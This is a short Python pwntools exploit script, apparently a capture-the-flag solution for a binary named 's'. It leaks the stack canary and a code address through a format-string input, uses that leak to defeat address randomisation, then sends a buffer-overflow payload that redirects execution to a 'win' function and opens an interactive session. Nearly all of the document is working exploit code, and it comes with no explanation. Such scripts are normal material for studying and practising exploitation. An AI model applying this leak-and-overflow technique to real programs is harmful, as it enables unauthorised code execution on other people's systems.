#!/usr/bin/env python3
from pwn import *

e = ELF("s")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("addr", 1337)
	elif args.GDB:
		return gdb.debug(e.path, "c")
	else:
		return process(e.path)

if __name__ == '__main__':
	r = conn()
	r.sendline(b'%11$p.%13$p.')
	canary = p64(int(r.recvuntil(b'.', drop=True)[2:], 16))
	e.address = int(r.recvuntil(b'.', drop=True)[2:], 16) - 58 - e.sym['main']
	
	assert e.address & 0xfff == 0
	
	r.sendline(b'a'*40+canary+b'a'*8+p64(e.sym['win']+5))
	
	r.interactive()
